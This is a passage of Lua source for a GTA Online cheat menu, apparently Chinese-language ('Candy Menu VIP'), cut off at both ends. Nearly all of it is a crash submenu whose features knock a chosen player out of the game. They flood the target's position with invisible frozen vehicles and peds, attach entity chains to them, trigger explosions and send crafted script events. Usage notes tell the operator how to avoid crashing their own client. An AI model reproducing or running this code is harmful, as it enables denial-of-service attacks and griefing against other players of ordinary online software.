                menu.notify("Done", "Net Ped Crash", 3, RGBAToInt(0, 255, 255, 255)) 
            end
        end)

menu.add_feature("Model崩溃", "action", crashmenu.id, function()
	menu.notify("Crashing...", "Model Crash", 2, RGBAToInt(0, 255, 255, 255))
    if pid ~= player.player_id() then
        local modelhash = {1057201338, 762327283, 2238511874}
        for k = 1, 3 do
        request_model(modelhash[k])
        end
        local crashped = {}
        pedp = player.get_player_ped(pid)
        pedmy = player.get_player_ped(player.player_id())
        mypos = player.get_player_coords(player.player_id())
        ppos = player.get_player_coords(pid)
        ZPOS = ppos.z
        if ppos.z == -50.0 or ppos.z == -180.0 or ppos.z == -0.0 then 
            local L_time = 0
            while true do
                entity.set_entity_coords_no_offset(pedmy,ppos)
                system.wait(50)
                local playerpos_no = player.get_player_coords(pid)
                if playerpos_no.z ~= -50.0 then
                    ZPOS = playerpos_no.z
                    entity.set_entity_coords_no_offset(pedmy,mypos)
                    break
                end
                L_time = L_time + 1
                if L_time > 100 then
                    ui.notify_above_map("目标坐标异常稍后再试", "", 140)
                    pedmy = player.get_player_ped(player.player_id())
                    entity.set_entity_coords_no_offset(pedmy,mypos)
                    return
                end
            end
        end
        system.wait(500)
        for k = 1, 9 do
        local pped = player.get_player_ped(pid)
        local ppos = entity.get_entity_coords(pped)
        ppos.z = ZPOS
        crashped[k] = ped.create_ped(28, modelhash[math.random(1, 3)], ppos, 0, true, false)
        system.wait(5)
        end
        system.wait(2000)
        for gay = 1, 5 do
            for k = 1, 9 do
                entity.set_entity_as_no_longer_needed(crashped[k])
                entity.delete_entity(crashped[k])
                system.wait(1000)
            end
        end
        menu.notify("Done", "Model Crash", 3, RGBAToInt(0, 255, 255, 255)) 
    end
end)

crash = menu.add_feature("猎杀崩溃", "action", crashmenu.id, function()
    menu.notify("崩溃已经发送", "Candy Menu VIP", 2, RGBAToInt(0, 255, 0))
    mypos = player.get_player_coords(player.player_id())
    pos = player.get_player_coords(pid)
    ppos = player.get_player_coords(pid)
    pedmy = player.get_player_ped(player.player_id())
    ZPOS = pos.z
    if pos.z == -50.0 or pos.z == -180.0 or pos.z == -0.0 then 
        local L_time = 0
        while true do
            entity.set_entity_coords_no_offset(pedmy,pos)
            system.wait(50)
            local pos_no = player.get_player_coords(pid)
            if pos_no.z ~= -50.0 then
                ZPOS = pos_no.z
                entity.set_entity_coords_no_offset(pedmy,mypos)
                break
            end
            L_time = L_time + 1
            if L_time > 100 then
                ui.notify_above_map("目标坐标异常稍后再试", "", 140)
                return
            end
        end
    end
    pos.z = ZPOS + 0.7
    ppos.x = ppos.x + 4000
    ppos.z = ppos.z + 2000
    pos.x = pos.x + 100
    entity.set_entity_coords_no_offset(pedmy,ppos)
    entity.freeze_entity(pedmy,true)
    car = spawn_vehicle(-42959138,pos,0)
    entity.freeze_entity(car,true)
    entity.set_entity_visible(car,false)
    for n = 0, 70 do
    car = spawn_vehicle(-42959138,pos,0)
    entity.freeze_entity(car,true)
    entity.set_entity_visible(car,false)
    system.wait(100)
    end
    system.wait(10000)
    allvehs = vehicle.get_all_vehicles()
    for i = 1, #allvehs do
        vehhash = entity.get_entity_model_hash(allvehs[i])
        if vehhash == -42959138 then
            entity.delete_entity(allvehs[i])
            system.wait(1)
        end
    end
    menu.notify("清理崩溃数据", "Candy Menu VIP", 2, RGBAToInt(0, 255, 0))
    entity.freeze_entity(pedmy,false)
    entity.set_entity_coords_no_offset(pedmy,mypos)
end)

crash = menu.add_feature("VEH崩溃", "action", crashmenu.id, function()
    menu.notify("Crashing...", "Chernoberg Crash", 2, RGBAToInt(0, 255, 255, 255))
    mypos = player.get_player_coords(player.player_id())
    pos = player.get_player_coords(pid)
    ppos = player.get_player_coords(pid)
    pedmy = player.get_player_ped(player.player_id())
    ZPOS = pos.z
    if pos.z == -50.0 or pos.z == -180.0 or pos.z == -0.0 then 
    local L_time = 0
    while true do
    entity.set_entity_coords_no_offset(pedmy,pos)
    system.wait(50)
            local pos_no = player.get_player_coords(pid)
            if pos_no.z ~= -50.0 then
                ZPOS = pos_no.z
                entity.set_entity_coords_no_offset(pedmy,mypos)
                break
            end
            L_time = L_time + 1
            if L_time > 100 then
                ui.notify_above_map("目标坐标异常稍后再试", "", 140)
                return
            end
        end
    end
    pos.z = ZPOS + 0.7
    ppos.x = ppos.x + 2000
    ppos.z = ppos.z + 4000
    entity.set_entity_coords_no_offset(pedmy,ppos)
    entity.freeze_entity(pedmy,true)
    car = spawn_vehicle(3602674979,pos,0)
    entity.freeze_entity(car,true)
    entity.set_entity_visible(car,false)
    for n = 0, 80 do
    car = spawn_vehicle(3602674979,pos,0)
    entity.freeze_entity(car,true)
    entity.set_entity_visible(car,false)
    system.wait(100)
    end
    system.wait(10000)
    allvehs = vehicle.get_all_vehicles()
    for i = 1, #allvehs do
    vehhash = entity.get_entity_model_hash(allvehs[i])
    if vehhash == 3602674979 then
        entity.delete_entity(allvehs[i])
        system.wait(1)
        end
    end
    menu.notify("清理崩溃数据", "Chernoberg Crash", 2, RGBAToInt(0, 255, 255, 255))
    entity.freeze_entity(pedmy,false)
    entity.set_entity_coords_no_offset(pedmy,mypos)
end)

menu.add_feature("致命崩溃","action",crashmenu.id,function()
menu.notify("崩溃已开始,请远离玩家,请勿观看玩家 " .. player.get_player_name(pid), "", 30, RGBAToInt(0, 255, 255, 255))
	pos = player.get_player_coords(pid)
	mypos = player.get_player_coords(player.player_id())
	pedmy = player.get_player_ped(player.player_id())
	local ppos = player.get_player_coords(pid)
	ZPOS = pos.z
	if pos.z == -50.0 or pos.z == -180.0 or pos.z == -0.0 then
		local L_time = 0
		while true do
			entity.set_entity_coords_no_offset(pedmy,pos)
			system.wait(50)
			local playerpos_no = player.get_player_coords(pid)
			if playerpos_no.z ~= -50.0 then
				ZPOS = playerpos_no.z
				entity.set_entity_coords_no_offset(pedmy,mypos)
				break
			end
			L_time = L_time + 1
			if L_time > 100 then
				ui.notify_above_map("目标坐标异常稍后再试", "", 140)
				entity.set_entity_coords_no_offset(pedmy,mypos)
				return
			end
		end
	end
	pos.z = ZPOS
	ppos.x = ppos.x + 2000
	ppos.z = ppos.z + 4000
	entity.set_entity_coords_no_offset(player.get_player_ped(player.player_id()),ppos)
	entity.freeze_entity(player.get_player_ped(player.player_id()), true)
	for i = 0,20 do
		fire.add_explosion(player.get_player_coords(pid),2, true, false, 0, player.get_player_ped(pid))
		script.trigger_script_event(0xc50f74ca, pid, {pid, 0, 30583, 0, 0, 0, -328966, 1132039228, 0})
		script.trigger_script_event(0x8638a0ab, pid, {pid, 0, 30583, 0, 0, 0, -328966, 1132039228, 0})
		script.trigger_script_event(0xc50f74ca, pid, {23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778,  23135423, 827870001, 23135423})
		npc = Cped(26, 0xE7A963D9,pos,0)
		network.request_control_of_entity(npc)
		entity.freeze_entity(npc)
	end
	system.wait(4000)
	allpeds = ped.get_all_peds()
	for i = 1, #allpeds  do
		pedhash = entity.get_entity_model_hash(allpeds[i])
		if pedhash == 0xE7A963D9 then
			entity.delete_entity(allpeds[i])
		end
	end
	menu.notify("已清除崩溃数据","Garble Crash", 3, RGBAToInt(0, 255, 255, 255))
	entity.freeze_entity(player.get_player_ped(player.player_id()), false)
	entity.set_entity_coords_no_offset(player.get_player_ped(player.player_id()),mypos)
end)

crashmid = menu.add_feature("MAP崩溃","action",crashmenu.id,function()
	menu.notify("崩溃已开始,请远离玩家,请勿观看玩家 " .. player.get_player_name(pid), "Veh Crash", 30, RGBAToInt(0, 255, 255, 255))
	pedmy = player.get_player_ped(player.player_id())
	mypos = player.get_player_coords(player.player_id())
	playerpos = player.get_player_coords(pid)
	local ppos = player.get_player_coords(pid)
	ZPOS = playerpos.z
	if playerpos.z == -50.0 or playerpos.z == -180.0 or playerpos.z == -0.0 then 
		local L_time = 0
		while true do
			entity.set_entity_coords_no_offset(pedmy,playerpos)
			system.wait(50)
			local playerpos_no = player.get_player_coords(pid)
			if playerpos_no.z ~= -50.0 then
			ZPOS = playerpos_no.z
			entity.set_entity_coords_no_offset(pedmy,mypos)
			break
			end
			L_time = L_time + 1
			if L_time > 100 then
			ui.notify_above_map("目标坐标异常稍后再试", "", 140)
			entity.set_entity_coords_no_offset(pedmy,mypos)
			return
			end
		end
	end
	playerpos.z = ZPOS
	ppos.x = ppos.x + 2000
	ppos.z = ppos.z + 4000
	entity.set_entity_coords_no_offset(player.get_player_ped(player.player_id()),ppos)
	entity.freeze_entity(player.get_player_ped(player.player_id()), true)
	poszdy = v3(-75.392,-819.270,326.175)
	for i = 0, 50 do
	local ppos = player.get_player_coords(pid)
	ppos.x = ppos.x
	ppos.y = ppos.y
	ppos.z = ZPOS
	fire.add_explosion(ppos,2, true, false, 0, player.get_player_ped(pid))
	pped = player.get_player_ped(pid)
	fire.start_entity_fire(pped)
	ped.clear_ped_tasks_immediately(pped)
	towtruck = supspawn_vehicle(-1323100960, poszdy,0)
	entity.set_entity_god_mode(towtruck, true)	
	entity.freeze_entity(towtruck, true)
	entity.set_entity_visible(towtruck,false)
	towtruck2 = supspawn_vehicle(-442313018, poszdy,0)
	entity.set_entity_god_mode(towtruck2, true)	
	entity.freeze_entity(towtruck2, true)
	entity.set_entity_visible(towtruck2,false)
	scrap = supspawn_vehicle(-1700801569, poszdy,0)
	entity.set_entity_god_mode(scrap, true)	
	entity.freeze_entity(scrap, true)
	entity.set_entity_visible(scrap,false)
	dinghy3	= supspawn_vehicle(509498602, poszdy,0)	
	entity.set_entity_god_mode(dinghy3, true)	
	entity.freeze_entity(dinghy3, true)
	entity.set_entity_visible(dinghy3,false)
	barracks = supspawn_vehicle(-823509173, poszdy,0)
	entity.set_entity_god_mode(barracks, true)	
	entity.freeze_entity(barracks, true)
	entity.set_entity_visible(barracks,false)
	entity.attach_entity_to_entity(towtruck2,towtruck, 0, v3(0, 0, 0), v3(0,0,0), false, true, false, 0, true)
	entity.attach_entity_to_entity(scrap,towtruck, 0, v3(0, 0,0), v3(0,0,0), false, true, false, 0, true)
	entity.attach_entity_to_entity(dinghy3,towtruck, 0, v3(0, 0, 0), v3(0,0,0), false, true, false, 0, true)
	entity.attach_entity_to_entity(barracks,towtruck, 0, v3(0, 0, 0), v3(0,0,0), false, true, false, 0, true)
	for i = 0, 50 do
	entity.set_entity_coords_no_offset(towtruck,ppos)
	system.wait(1)
    end
	system.wait(1)
	end
	system.wait(4000)
	entity.freeze_entity(player.get_player_ped(player.player_id()), false)
	entity.set_entity_coords_no_offset(player.get_player_ped(player.player_id()),mypos)
end)

do
menu.add_feature("点击查看崩溃事项!!!", "action", crashmenu.id, function()
menu.notify("1.使用崩溃之前打开自由镜头\n2.玩家禁止摔倒.自杀.被撞\n3.切换战局会自崩 有限制\n4.请谨慎使用", "崩溃事项", 7,RGBAToInt(255, 0, 0))
end)
end

crash= menu.add_feature("玩家崩溃", "action_value_str", crashmenu.id, function(f)
if f.value == 0 then
mypos = player.get_player_coords(c.me())
pedp = player.get_player_ped(c.me())
pos = player.get_player_coords(c.me())
tr2 = spawn_vehicle(390902130, pos,0)
entity.attach_entity_to_entity(tr2,pedp, 0, v3(0, 0, -10), v3(0,0,0), false, true, false, 0, true)
c.wait(500)
for i = 0 , 50 do
playerpos = player.get_player_coords(pid)
entity.set_entity_coords_no_offset(pedp,playerpos)
c.wait(20)
end
c.wait(20)
entity.set_entity_coords_no_offset(pedp,mypos)
elseif f.value == 1 then

pedp = player.get_player_ped(pid)
pedmy = player.get_player_ped(c.me())
pos = player.get_player_coords(pid)
towtruck = spawn_vehicle(-1323100960, pos,0)
entity.set_entity_god_mode(towtruck, true)	
entity.freeze_entity(towtruck, true)			
towtruck2 = spawn_vehicle(-442313018, pos,0)
entity.set_entity_god_mode(towtruck2, true)	
entity.freeze_entity(towtruck2, true)
scrap = spawn_vehicle(-1700801569, pos,0)
entity.set_entity_god_mode(scrap, true)	
entity.freeze_entity(scrap, true)					
dinghy3	= spawn_vehicle(509498602, pos,0)	
entity.set_entity_god_mode(dinghy3, true)	
entity.freeze_entity(dinghy3, true)		
barracks = spawn_vehicle(-823509173, pos,0)
entity.set_entity_god_mode(barracks, true)	
entity.freeze_entity(barracks, true)
entity.attach_entity_to_entity(towtruck2,towtruck, 0, v3(0, 0, 0), v3(0,0,0), false, true, false, 0, true)
entity.attach_entity_to_entity(scrap,towtruck, 0, v3(0, 0,0), v3(0,0,0), false, true, false, 0, true)
entity.attach_entity_to_entity(dinghy3,towtruck, 0, v3(0, 0, 0), v3(0,0,0), false, true, false, 0, true)
entity.attach_entity_to_entity(barracks,towtruck, 0, v3(0, 0, 0), v3(0,0,0), false, true, false, 0, true)
entity.attach_entity_to_entity(towtruck,pedp, 0, v3(0, 0, 0), v3(0,0,0), false, true, false, 0, true)
playerpos = player.get_player_coords(pid)
entity.set_entity_coords_no_offset(pedmy,playerpos)
elseif f.value == 2 then

mypos = player.get_player_coords(c.me())
pedp = player.get_player_ped(c.me())
pos = player.get_player_coords(c.me())
tr2 = spawn_vehicle(-1881846085, pos,0)
entity.attach_entity_to_entity(tr2,pedp, 0, v3(0, 0, -10), v3(0,0,0), false, true, false, 0, true)
c.wait(500)
for i = 0 , 50 do
playerpos = player.get_player_coords(pid)
entity.set_entity_coords_no_offset(pedp,playerpos)
c.wait(20)
end
c.wait(20)
entity.set_entity_coords_no_offset(pedp,mypos)

elseif f.value == 3 then
pedmy = player.get_player_ped(c.me())
entity.freeze_entity(pedmy, true)
entity.set_entity_god_mode(pedmy, true)		
entity.set_entity_coords_no_offset(pedmy,v3(5000,5000,5000))
pos = player.get_player_coords(c.me())
towtruck = spawn_vehicle(-1323100960, pos,0)
entity.set_entity_god_mode(towtruck, true)	
entity.freeze_entity(towtruck, true)			
towtruck2 = spawn_vehicle(-442313018, pos,0)
entity.set_entity_god_mode(towtruck2, true)	
entity.freeze_entity(towtruck2, true)
scrap = spawn_vehicle(-1700801569, pos,0)
entity.set_entity_god_mode(scrap, true)	
entity.freeze_entity(scrap, true)					
dinghy3	= spawn_vehicle(509498602, pos,0)	
entity.set_entity_god_mode(dinghy3, true)	
entity.freeze_entity(dinghy3, true)		
barracks = spawn_vehicle(-823509173, pos,0)
entity.set_entity_god_mode(barracks, true)	
entity.freeze_entity(barracks, true)
entity.attach_entity_to_entity(towtruck2,towtruck, 0, v3(0, 0, 0), v3(0,0,0), false, true, false, 0, true)
entity.attach_entity_to_entity(scrap,towtruck, 0, v3(0, 0,0), v3(0,0,0), false, true, false, 0, true)
entity.attach_entity_to_entity(dinghy3,towtruck, 0, v3(0, 0, 0), v3(0,0,0), false, true, false, 0, true)
entity.attach_entity_to_entity(barracks,towtruck, 0, v3(0, 0, 0), v3(0,0,0), false, true, false, 0, true)
entity.attach_entity_to_entity(towtruck,pedmy, 0, v3(0, 0, 0), v3(0,0,0), false, true, false, 0, true)
tr2 = spawn_vehicle(-1881846085, pos,0)
entity.attach_entity_to_entity(tr2,pedmy, 0, v3(0, 0,0), v3(0,0,0), false, true, false, 0, true)
for i = 0 , 50 do
playerpos = player.get_player_coords(pid)
entity.set_entity_coords_no_offset(pedp,playerpos)
c.wait(20)
end
c.wait(20)
entity.set_entity_coords_no_offset(pedmy,v3(5000,5000,5000))
end
end):set_str_data({
"神崩[切战局自崩]",
"拖车崩溃",
"神崩2[切战局自崩]",
"AIO[切战局自崩]"
})

do
menu.add_feature("点击查看崩溃事项!!!", "action", crashmenu.id, function()
menu.notify("1.请勿靠近玩家 必须远离\n2.请勿观看被崩玩家视角\n3.不要频繁发送崩溃\n4.崩溃数据会自动清除", "使用PED崩溃事项", 7,RGBAToInt(255, 0, 0))
end)
end

WEIDECRASH = menu.add_feature("川普崩溃", "action_value_str", crashmenu.id, function(f)
		if f.value == 0 then
		mypos = player.get_player_coords(player.player_id())
		playerpos = player.get_player_coords(pid)
		ppos = player.get_player_coords(pid)
		pedmy = player.get_player_ped(player.player_id())
		ZPOS = playerpos.z
		if playerpos.z == -50.0 or playerpos.z == -180.0 or playerpos.z == -0.0 then 
		local L_time = 0
		while true do
		entity.set_entity_coords_no_offset(pedmy,playerpos)
		system.wait(50)
		local playerpos_no = player.get_player_coords(pid)
		if playerpos_no.z ~= -50.0 then
		ZPOS = playerpos_no.z
		entity.set_entity_coords_no_offset(pedmy,mypos)
		break
		end
	    L_time = L_time + 1
		if L_time > 100 then
		ui.notify_above_map("目标坐标异常稍后再试", "", 140)
		entity.set_entity_coords_no_offset(pedmy,mypos)
		return
		end
		end
		end
		system.wait(1)
		ppos.x = ppos.x + 2000
		ppos.z = ppos.z + 4000
		entity.set_entity_coords_no_offset(player.get_player_ped(player.player_id()),ppos)
		entity.freeze_entity(player.get_player_ped(player.player_id()), true)
		system.wait(100)
		pos = v3(-75.392,-819.270,326.175)
		wade = Cped(26, 0xD266D9D6,pos , 0)
		entity.set_entity_god_mode(wade, true)
		entity.freeze_entity(wade, true)
		for i = 1 , 100 do
		invalidpeda = Cped(i, 0xD266D9D6,pos , 0)
		entity.set_entity_god_mode(invalidpeda, true)
		entity.freeze_entity(invalidpeda, true)
		entity.attach_entity_to_entity(invalidpeda, wade, 0, v3(0,0,0), v3(0,0,0), true, false, false, 0, true)
		system.wait(1)
		end
		system.wait(1000)
		for j = 0, 150 do
		local ppos = player.get_player_coords(pid)
		local headpid = player.get_player_heading(pid)
		local headpid = math.rad((headpid - 180) * -1)
		ppos.x = ppos.x + math.sin(headpid) * -5
		ppos.y = ppos.y + math.cos(headpid) * -5
		ppos.z = ZPOS
		entity.set_entity_coords_no_offset(wade,ppos)
		end
		system.wait(20000)
		entity.detach_entity(wade)
		system.wait(300)
		allpeds = ped.get_all_peds()
		for i = 1, #allpeds  do
		pedhash = entity.get_entity_model_hash(allpeds[i])
		if pedhash == 0xD266D9D6 then
		entity.delete_entity(allpeds[i])
		end
		end
		ui.notify_above_map("崩溃数据清除完毕", "", 140)
		entity.freeze_entity(player.get_player_ped(player.player_id()), false)
		entity.set_entity_coords_no_offset(player.get_player_ped(player.player_id()),mypos)
		elseif f.value == 1 then
		mypos = player.get_player_coords(player.player_id())
		playerpos = player.get_player_coords(pid)
		pedmy = player.get_player_ped(player.player_id())
		ZPOS = playerpos.z
		if playerpos.z == -50.0 or playerpos.z == -180.0 or playerpos.z == -0.0 then 
		local L_time = 0
		while true do
		entity.set_entity_coords_no_offset(pedmy,playerpos)
		system.wait(50)
		local playerpos_no = player.get_player_coords(pid)
		if playerpos_no.z ~= -50.0 then
		ZPOS = playerpos_no.z
		entity.set_entity_coords_no_offset(pedmy,mypos)
		break
		end
		L_time = L_time + 1
		if L_time > 100 then
		ui.notify_above_map("目标坐标异常稍后再试", "", 140)
		entity.set_entity_coords_no_offset(pedmy,mypos)
		return
		end
		end
		end
		system.wait(100)
		pos = v3(-75.392,-819.270,326.175)
		wade = Cped(26, 0xD266D9D6,pos , 0)
		entity.set_entity_god_mode(wade, true)
		entity.freeze_entity(wade, true)
		for i = 1 , 100 do
		invalidpeda = Cped(i, 0xD266D9D6,pos , 0)
		entity.set_entity_god_mode(invalidpeda, true)
		entity.freeze_entity(invalidpeda, true)
		entity.attach_entity_to_entity(invalidpeda, wade, 0, v3(0,0,0), v3(0,0,0), true, false, false, 0, true)
		system.wait(1)
		end
		system.wait(1000)
		for j = 0, 150 do
		local ppos = player.get_player_coords(pid)
		local headpid = player.get_player_heading(pid)
		local headpid = math.rad((headpid - 180) * -1)
		ppos.x = ppos.x + math.sin(headpid) * -5
		ppos.y = ppos.y + math.cos(headpid) * -5
		ppos.z = ZPOS
		entity.set_entity_coords_no_offset(wade,ppos)
		end
		system.wait(20000)
		entity.detach_entity(wade)
		system.wait(300)
		allpeds = ped.get_all_peds()
		for i = 1, #allpeds  do
		pedhash = entity.get_entity_model_hash(allpeds[i])
		if pedhash == 0xD266D9D6 then
		entity.delete_entity(allpeds[i])
		end
		end
	    ui.notify_above_map("崩溃数据清除完毕", "", 140)
		elseif f.value == 2 then
		playerpos = player.get_player_coords(pid)
		mypos = player.get_player_coords(player.player_id())
		pedmy = player.get_player_ped(player.player_id())
		ZPOS = playerpos.z
		if playerpos.z == -50.0 or playerpos.z == -180.0 or playerpos.z == -0.0 then 
		local L_time = 0
		while true do
		entity.set_entity_coords_no_offset(pedmy,playerpos)
		system.wait(50)
		local playerpos_no = player.get_player_coords(pid)
		if playerpos_no.z ~= -50.0 then
		ZPOS = playerpos_no.z
		entity.set_entity_coords_no_offset(pedmy,mypos)
		break
		end
		L_time = L_time + 1
		if L_time > 100 then
		ui.notify_above_map("目标坐标异常稍后再试", "", 140)
		entity.set_entity_coords_no_offset(pedmy,mypos)
		return
		end
		end
		end
		playerpos.z = ZPOS
		ppos = player.get_player_coords(pid)
		ppos.x = ppos.x + 2000
		ppos.z = ppos.z + 4000
		entity.set_entity_coords_no_offset(player.get_player_ped(player.player_id()),ppos)
		entity.freeze_entity(player.get_player_ped(player.player_id()), true)
		system.wait(100)
		dune = spawn_vehicle(0x9cf21e0f,playerpos,0)
		entity.set_entity_god_mode(dune)
		entity.freeze_entity(dune, true)
		dune1 = spawn_vehicle(0x9cf21e0f,playerpos,0)
		entity.set_entity_god_mode(dune1)
		entity.freeze_entity(dune1, true)
		barracks = spawn_vehicle(0xceea3f4b,playerpos,0)
		entity.set_entity_god_mode(barracks)
		entity.freeze_entity(barracks, true)
		barracks1 = spawn_vehicle(0xceea3f4b,playerpos,0)
		entity.set_entity_god_mode(barracks1)
		entity.freeze_entity(barracks1, true)
		dunecar = spawn_vehicle(0xe5a2d6c6,playerpos,0)
		entity.set_entity_god_mode(dunecar)
		entity.freeze_entity(dunecar, true)
		dunecar1 = spawn_vehicle(0xe5a2d6c6,playerpos,0)
		entity.set_entity_god_mode(dunecar1)
		entity.freeze_entity(dunecar1, true)
		dunecar2 = spawn_vehicle(0xe5a2d6c6,playerpos,0)
		entity.set_entity_god_mode(dunecar2)
		entity.freeze_entity(dunecar2, true)
		barracks3 = spawn_vehicle(0x2592b5cf,playerpos,0)
		entity.set_entity_god_mode(barracks3)
		entity.freeze_entity(barracks3, true)
		barracks31 = spawn_vehicle(0x2592b5cf,playerpos,0)
		entity.set_entity_god_mode(barracks31)
		entity.freeze_entity(barracks31, true)
		entity.attach_entity_to_entity(barracks3, dunecar, 0, v3(0,0,0), v3(0,0,0), true, true, false, 0, true)
		entity.attach_entity_to_entity(barracks31, dunecar, 0, v3(0,0,0), v3(0,0,0), true, true, false, 0, true)
		entity.attach_entity_to_entity(barracks, dunecar, 0, v3(0,0,0), v3(0,0,0), true, true, false, 0, true)
		entity.attach_entity_to_entity(barracks1, dunecar, 0, v3(0,0,0), v3(0,0,0), true, true, false, 0, true)
		entity.attach_entity_to_entity(dune, dunecar, 0, v3(0,0,0), v3(0,0,0), true, true, false, 0, true)
		entity.attach_entity_to_entity(dune1, dunecar, 0, v3(0,0,0), v3(0,0,0), true, true, false, 0, true)
		entity.attach_entity_to_entity(dunecar1, dunecar, 0, v3(0,0,0), v3(0,0,0), true, true, false, 0, true)
		entity.attach_entity_to_entity(dunecar2, dunecar, 0, v3(0,0,0), v3(0,0,0), true, true, false, 0, true)
		ppos = player.get_player_coords(pid)
		ppos.x = ppos.x
		ppos.y = ppos.y
		ppos.z = ZPOS
		entity.set_entity_coords_no_offset(dunecar,ppos)
		pos = v3(-75.392,-819.270,326.175)
		wade = Cped(26, 0xD266D9D6,pos , 0)
		entity.set_entity_god_mode(wade, true)
		entity.freeze_entity(wade, true)
		for i = 1 , 100 do
		invalidpeda = Cped(i, 0xD266D9D6,pos , 0)
		entity.set_entity_god_mode(invalidpeda, true)
		entity.freeze_entity(invalidpeda, true)
		entity.attach_entity_to_entity(invalidpeda, wade, 0, v3(0,0,0), v3(0,0,0), true, false, false, 0, true)
		system.wait(1)
		end
		system.wait(1000)
		for j = 0, 150 do
		local ppos = player.get_player_coords(pid)
		local headpid = player.get_player_heading(pid)
		local headpid = math.rad((headpid - 180) * -1)
		ppos.x = ppos.x + math.sin(headpid) * -5
		ppos.y = ppos.y + math.cos(headpid) * -5
		ppos.z = ZPOS
		entity.set_entity_coords_no_offset(wade,ppos)
		end
		system.wait(200000)
		entity.detach_entity(wade)
		system.wait(300)
		allpeds = ped.get_all_peds()
		for i = 1, #allpeds  do
		pedhash = entity.get_entity_model_hash(allpeds[i])
		if pedhash == 0xD266D9D6 then
		entity.delete_entity(allpeds[i])
		end
		end
		QINGCHUVCEN()
		entity.freeze_entity(player.get_player_ped(player.player_id()), false)
		entity.set_entity_coords_no_offset(player.get_player_ped(player.player_id()),mypos)
	    elseif f.value == 3 then
		playerpos = player.get_player_coords(pid)
		mypos = player.get_player_coords(player.player_id())
		pedmy = player.get_player_ped(player.player_id())
		ZPOS = playerpos.z
		if playerpos.z == -50.0 or playerpos.z == -180.0 or playerpos.z == -0.0 then 
		local L_time = 0
		while true do
		entity.set_entity_coords_no_offset(pedmy,playerpos)
		system.wait(50)
		local playerpos_no = player.get_player_coords(pid)
		if playerpos_no.z ~= -50.0 then
		ZPOS = playerpos_no.z
		entity.set_entity_coords_no_offset(pedmy,mypos)
		break
		end
		L_time = L_time + 1
		if L_time > 100 then
		ui.notify_above_map("目标坐标异常稍后再试", "", 140)
		entity.set_entity_coords_no_offset(pedmy,mypos)
		return
		end
		end
		end
		playerpos.z = ZPOS + 0.7
		system.wait(100)
		dune = spawn_vehicle(0x9cf21e0f,playerpos,0)
		entity.set_entity_god_mode(dune)
		entity.freeze_entity(dune, true)
		dune1 = spawn_vehicle(0x9cf21e0f,playerpos,0)
		entity.set_entity_god_mode(dune1)
		entity.freeze_entity(dune1, true)
		barracks = spawn_vehicle(0xceea3f4b,playerpos,0)
		entity.set_entity_god_mode(barracks)
		entity.freeze_entity(barracks, true)
		barracks1 = spawn_vehicle(0xceea3f4b,playerpos,0)
		entity.set_entity_god_mode(barracks1)
		entity.freeze_entity(barracks1, true)
		dunecar = spawn_vehicle(0xe5a2d6c6,playerpos,0)
		entity.set_entity_god_mode(dunecar)
		entity.freeze_entity(dunecar, true)
		dunecar1 = spawn_vehicle(0xe5a2d6c6,playerpos,0)
		entity.set_entity_god_mode(dunecar1)
		entity.freeze_entity(dunecar1, true)
		dunecar2 = spawn_vehicle(0xe5a2d6c6,playerpos,0)
		entity.set_entity_god_mode(dunecar2)
		entity.freeze_entity(dunecar2, true)
		barracks3 = spawn_vehicle(0x2592b5cf,playerpos,0)
		entity.set_entity_god_mode(barracks3)
		entity.freeze_entity(barracks3, true)
		barracks31 = spawn_vehicle(0x2592b5cf,playerpos,0)
		entity.set_entity_god_mode(barracks31)
		entity.freeze_entity(barracks31, true)
		entity.attach_entity_to_entity(barracks3, dunecar, 0, v3(0,0,0), v3(0,0,0), true, true, false, 0, true)
		entity.attach_entity_to_entity(barracks31, dunecar, 0, v3(0,0,0), v3(0,0,0), true, true, false, 0, true)
		entity.attach_entity_to_entity(barracks, dunecar, 0, v3(0,0,0), v3(0,0,0), true, true, false, 0, true)
		entity.attach_entity_to_entity(barracks1, dunecar, 0, v3(0,0,0), v3(0,0,0), true, true, false, 0, true)
		entity.attach_entity_to_entity(dune, dunecar, 0, v3(0,0,0), v3(0,0,0), true, true, false, 0, true)
		entity.attach_entity_to_entity(dune1, dunecar, 0, v3(0,0,0), v3(0,0,0), true, true, false, 0, true)
		entity.attach_entity_to_entity(dunecar1, dunecar, 0, v3(0,0,0), v3(0,0,0), true, true, false, 0, true)
		entity.attach_entity_to_entity(dunecar2, dunecar, 0, v3(0,0,0), v3(0,0,0), true, true, false, 0, true)
		ppos = player.get_player_coords(pid)
		ppos.x = ppos.x
		ppos.y = ppos.y
		ppos.z = ZPOS + 0.7
		entity.set_entity_coords_no_offset(dunecar,ppos)
		pos = v3(-75.392,-819.270,326.175)
		wade = Cped(26, 0xD266D9D6,pos , 0)
		entity.set_entity_god_mode(wade, true)
		entity.freeze_entity(wade, true)
		for i = 1 , 100 do
		invalidpeda = Cped(i, 0xD266D9D6,pos , 0)
		entity.set_entity_god_mode(invalidpeda, true)
		entity.freeze_entity(invalidpeda, true)
		entity.attach_entity_to_entity(invalidpeda, wade, 0, v3(0,0,0), v3(0,0,0), true, false, false, 0, true)
		system.wait(1)
		end
		system.wait(1000)
		for j = 0, 150 do
		local ppos = player.get_player_coords(pid)
		local headpid = player.get_player_heading(pid)
		local headpid = math.rad((headpid - 180) * -1)
		ppos.x = ppos.x + math.sin(headpid) * -5
		ppos.y = ppos.y + math.cos(headpid) * -5
		ppos.z = ZPOS
		entity.set_entity_coords_no_offset(wade,ppos)
		end
		system.wait(20000)
		entity.detach_entity(wade)
		system.wait(300)
		allpeds = ped.get_all_peds()
		for i = 1, #allpeds  do
	    pedhash = entity.get_entity_model_hash(allpeds[i])
	    if pedhash == 0xD266D9D6 then
		entity.delete_entity(allpeds[i])
		end
		end
		QINGCHUVCEN()
		end
		end):set_str_data({
		"自动远离",
		"手动远离",
		"VC崩+韦德崩(自动远离)",
		"VC崩+韦德崩(手动远离)"
		})		

WEIDECRASH = menu.add_feature("富兰克林崩溃", "action_value_str", crashmenu.id, function(f)
		if f.value == 0 then
		mypos = player.get_player_coords(player.player_id())
		playerpos = player.get_player_coords(pid)
		ppos = player.get_player_coords(pid)
		pedmy = player.get_player_ped(player.player_id())
		ZPOS = playerpos.z
		if playerpos.z == -50.0 or playerpos.z == -180.0 or playerpos.z == -0.0 then 
		local L_time = 0
		while true do
		entity.set_entity_coords_no_offset(pedmy,playerpos)
		system.wait(50)
		local playerpos_no = player.get_player_coords(pid)
		if playerpos_no.z ~= -50.0 then
		ZPOS = playerpos_no.z
		entity.set_entity_coords_no_offset(pedmy,mypos)
		break
		end
	    L_time = L_time + 1
		if L_time > 100 then
